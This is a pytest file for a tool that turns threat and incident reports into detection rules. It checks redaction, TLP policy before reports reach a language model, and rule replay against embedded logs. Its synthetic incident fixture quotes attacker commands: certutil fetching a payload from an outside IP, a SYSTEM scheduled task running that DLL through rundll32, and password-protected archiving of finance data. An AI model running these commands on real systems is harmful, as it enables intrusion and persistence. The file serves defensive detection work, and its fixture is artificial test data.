"""Internal incident reports: redaction, TLP policy, formats, evidence replay (no API calls)."""
from __future__ import annotations

import io
import zipfile
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from ti2dac import pipeline, redact
from ti2dac.config import FetchConfig
from ti2dac.feedback import Store
from ti2dac.ingest import load_report
from ti2dac.render import load_record, render

from .conftest import FakeLLM

INCIDENT = r'''TLP:AMBER — INTERNAL USE ONLY
# Incident Report IR-2026-0147: Ransomware precursor activity on finance workstation
Prepared by: SOC Tier 3 (j.rahman@shl-corp.com) | Severity: High | Status: Contained

## Executive summary
The EDR alerted on FIN-WS-0231.shl.local (10.20.31.45), used by SHL\mkarim. Customer data of ACME Bank Ltd may
have been viewed. Root cause: macro document. Containment: host isolated.

## Timeline (UTC)
| 14:03 | FIN-WS-0231 | certutil.exe -urlcache -split -f http://185.220.101.4/a.png C:\Users\mkarim\AppData\Local\Temp\a.dll |
| 14:11 | FIN-WS-0231 | schtasks /create /tn "OneDrive Sync Helper" /tr "rundll32.exe C:\Users\mkarim\AppData\Local\Temp\a.dll,DllRegisterServer" /sc onlogon /ru SYSTEM |
| 14:31 | FIN-WS-0231 | \\FIN-FS-02\Finance$ accessed; 7z.exe a -pP@ssw0rd123 C:\ProgramData\f.7z |
| 14:52 | FIN-WS-0231 | Host isolated by SOC analyst a.hossain; exploit chain resembled CVE-2024-38112 |

## Evidence
{"EventID": 1, "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn \"OneDrive Sync Helper\" /tr \"rundll32.exe C:\\Users\\mkarim\\a.dll\" /sc onlogon /ru SYSTEM", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "SHL\\mkarim", "Computer": "FIN-WS-0231.shl.local"}
{"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://185.220.101.4/a.png a.dll", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}

The service account svc_backup (SID S-1-5-21-3623811015-3361044348-30300820-1013) password was found in a script:
$pass = "Backup#2026!" and has been rotated.
'''
SENSITIVE = ["mkarim", "FIN-WS-0231", "10.20.31.45", "j.rahman", "ACME Bank", "Backup#2026!", "P@ssw0rd123",
             "S-1-5-21-3623811015", "a.hossain", "shl.local", "FIN-FS-02", "svc_backup"]


@pytest.fixture
def incident_file(tmp_path) -> Path:
    p = tmp_path / "IR-2026-0147.md"
    p.write_text(INCIDENT)
    return p


def _isettings(settings):
    settings.redaction.internal_domains = ["shl.local", "shl-corp.com"]
    settings.redaction.terms = ["ACME Bank Ltd", "ACME Bank"]
    return settings


def test_redaction_removes_identities_keeps_detection_content():
    r = redact.redact(INCIDENT, internal_domains=["shl.local", "shl-corp.com"], terms=["ACME Bank Ltd"])
    assert [s for s in SENSITIVE if s in r.text] == []
    for keep in ["certutil.exe -urlcache -split -f http://185.220.101.4/a.png", "a.dll,DllRegisterServer",
                 "/sc onlogon /ru SYSTEM", "C:\\ProgramData\\f.7z", "C:\\\\Windows\\\\System32\\\\schtasks.exe",
                 "CVE-2024-38112"]:
        assert keep in r.text, keep
    assert "[SECRET]" in r.text and not any("Backup#2026!" in v for v in r.mapping.values()), "secrets are not reversible"
    assert r.mapping["[USER_1]"] == "mkarim"
    # same entity -> same placeholder everywhere (profile path, DOMAIN\user, JSON evidence)
    assert r.text.count("[USER_1]") >= 4


def test_tlp_detection_and_policy(settings, incident_file):
    assert redact.detect_tlp("TLP:GREEN ... later TLP: RED appendix") == "red"
    assert redact.detect_tlp("tlp:white") == "clear" and redact.detect_tlp("no marking") == ""
    settings.ai.provider = "gemini"
    loaded = load_report(str(incident_file), FetchConfig())
    with pytest.raises(pipeline.PolicyError, match="TLP:AMBER"):
        pipeline.prepare_report(loaded, settings)
    unmarked = load_report(str(incident_file), FetchConfig())
    unmarked.text = unmarked.text.replace("TLP:AMBER", "")
    with pytest.raises(pipeline.PolicyError, match="assumed for an unmarked incident"):
        pipeline.prepare_report(unmarked, settings)
    settings.ai.enabled = False                       # deterministic mode never sends anything
    pipeline.prepare_report(load_report(str(incident_file), FetchConfig()), settings)


def test_incident_end_to_end_nothing_sensitive_reaches_the_model(settings, incident_file, monkeypatch):
    _isettings(settings)
    fake = FakeLLM(settings, bad_first=False)
    monkeypatch.setattr(pipeline, "LLM", lambda s, *a: fake)
    store = Store(settings.db_path)
    record, loaded = pipeline.run(str(incident_file), settings, store=store, explicit=["B1"], actor="alice")
    assert record.report.kind == "incident" and record.report.tlp_effective == "amber"
    sent = "\n".join(u for _, u in fake.calls)
    assert [s for s in SENSITIVE if s in sent] == [], "sensitive data must never be sent to the AI"
    assert "internal incident report" in sent
    # the incident's own logs prove the rule: the embedded schtasks event matches
    pkg = record.packages[0]
    assert record.report.embedded_events == 2 and pkg.evidence_matches == 1
    assert any(r["target"] == "sigma_replay" and r["result"] == "fired" for r in store.test_results(record.run_id))
    out = Path(settings.output_dir) / record.run_id
    render(record, out, raw=loaded.raw, filename=loaded.filename, redaction_map=loaded.redaction_map,
           embedded_events=loaded.embedded_events)
    assert "mkarim" in (out / "source" / "redaction-map.json").read_text()      # local only
    for shared in ["report-summary.md", "behaviour-analysis.yaml", f"rules/{next((out / 'rules').glob('*.yml')).name}"]:
        assert not [s for s in SENSITIVE if s in (out / shared).read_text()], shared
    store.register_run(record, str(out))
    zf = zipfile.ZipFile(io.BytesIO(TestClient(__import__("ti2dac.web.app", fromlist=["x"]).create_app(settings))
                                    .get(f"/runs/{record.run_id}/download").content))
    assert not [n for n in zf.namelist() if n.startswith(("source/", "evidence/"))]


def test_tlp_override_is_audited(settings, incident_file, monkeypatch):
    _isettings(settings)
    settings.ai.provider = "gemini"
    fake = FakeLLM(settings, bad_first=False)
    monkeypatch.setattr(pipeline, "LLM", lambda s, *a: fake)
    store = Store(settings.db_path)
    record, _ = pipeline.run(str(incident_file), settings, store=store, explicit=["B1"], actor="alice",
                             tlp_override="synthetic training report, approved by CISO")
    assert record.report.tlp_override and any("overridden" in w for w in record.warnings)
    assert any(a["action"] == "tlp.override" for a in store.audit_entries())


def test_rule_with_placeholder_is_repaired(settings, report_file, monkeypatch):
    from ti2dac.models import FieldCondition

    from .conftest import task_draft

    class HostSpecific(FakeLLM):
        def structured(self, stage, system, user, schema):
            if stage == "generate":
                self.calls.append((stage, user))
                d = task_draft()
                d.sigma.selections[0].clauses[0].conditions.append(
                    FieldCondition(field="Computer", modifiers=[], values=["[HOST_1]"]))
                return d
            return super().structured(stage, system, user, schema)

    fake = HostSpecific(settings)
    monkeypatch.setattr(pipeline, "LLM", lambda s, *a: fake)
    record, _ = pipeline.run(str(report_file), settings, store=Store(settings.db_path))
    task = next(p for p in record.packages if p.behaviour.technique_id == "T1053.005")
    assert "[HOST_1]" not in task.rule_yaml and task.repair_attempts >= 1
    repair_prompt = next(u for s, u in fake.calls if s == "repair")
    assert "redacted placeholders" in repair_prompt


def test_incident_detection_heuristic():
    assert pipeline.looks_like_incident(INCIDENT)
    assert not pipeline.looks_like_incident("APT29 used spearphishing and Cobalt Strike to deploy tooling.")


def test_docx_and_eml_ingestion(tmp_path):
    from docx import Document

    doc = Document()
    doc.add_heading("Incident Report IR-1", 0)
    doc.add_paragraph("The attacker ran certutil to download a payload.")
    table = doc.add_table(rows=2, cols=3)
    for i, row in enumerate([("Time", "Host", "Event"), ("14:03", "WS-0231", "certutil.exe -urlcache -f http://x/a a.dll")]):
        for j, v in enumerate(row):
            table.rows[i].cells[j].text = v
    path = tmp_path / "ir.docx"
    doc.save(path)
    # short docs are rejected (<200 chars); pad the document
    doc.add_paragraph("Containment: the host was isolated and credentials were reset. " * 5)
    doc.save(path)
    loaded = load_report(str(path), FetchConfig())
    assert "| 14:03 | WS-0231 | certutil.exe -urlcache" in loaded.text and loaded.text.startswith("## Incident Report")

    eml = tmp_path / "alert.eml"
    eml.write_bytes(b"From: soc@corp.example\r\nTo: ir@corp.example\r\nSubject: IR-7 rundll32 abuse\r\n"
                    b"Content-Type: text/plain\r\n\r\n" + b"rundll32.exe C:\\Users\\bob\\a.dll,Start was executed. " * 8)
    loaded = load_report(str(eml), FetchConfig())
    assert loaded.meta.title == "IR-7 rundll32 abuse" and "rundll32.exe" in loaded.text


def test_public_report_content_is_not_over_redacted():
    """False positives found on the real report corpus; these carry detection meaning and must survive."""
    text = (r"Payload encoded as UTF-16 and AES-256 / AES-GCM-256, attributed to STORM-1849 and DEV-0537 (see ZDI-CAN-24433, "
            r"ICS-ALERT-14). Delay via ping 127.0.0.1 -n 5, scan of 10.0.0.0/8. Dropped to %APPDATA%\\Microsoft\\x.dll and "
            r"C:\Windows\SysWOW64\rundll32.exe; HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run; "
            r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe; NT AUTHORITY\SYSTEM; \\tsclient\c; "
            r"%TEMP%\ComponentStyle.zip; shellcode \\x90\\x90; files p.enc and s.inc")
    r = redact.redact(text)
    assert r.text == text, r.mapping
